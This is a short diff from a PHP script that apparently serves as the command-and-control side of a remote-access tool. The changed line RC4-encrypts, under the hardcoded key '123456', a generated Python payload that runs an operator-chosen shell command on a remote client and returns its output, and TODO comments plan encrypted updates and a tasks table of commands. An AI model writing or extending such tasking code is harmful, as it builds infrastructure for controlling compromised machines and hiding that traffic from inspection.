@@ -103,7 +103,7 @@
 
                     # TO DO: Add in RC4 encrypted update to "update.php"
                     # TO DO: Add in retrieval of command from "tasks" table
-                    echo "import subprocess; process = subprocess.Popen('" . $task_secondary . "', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); out, err = process.communicate(); print err; print out";
+                    echo rc4("123456", "import subprocess; process = subprocess.Popen('" . $task_secondary . "', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE); out, err = process.communicate(); print err; print out");
                 }
             }
         }
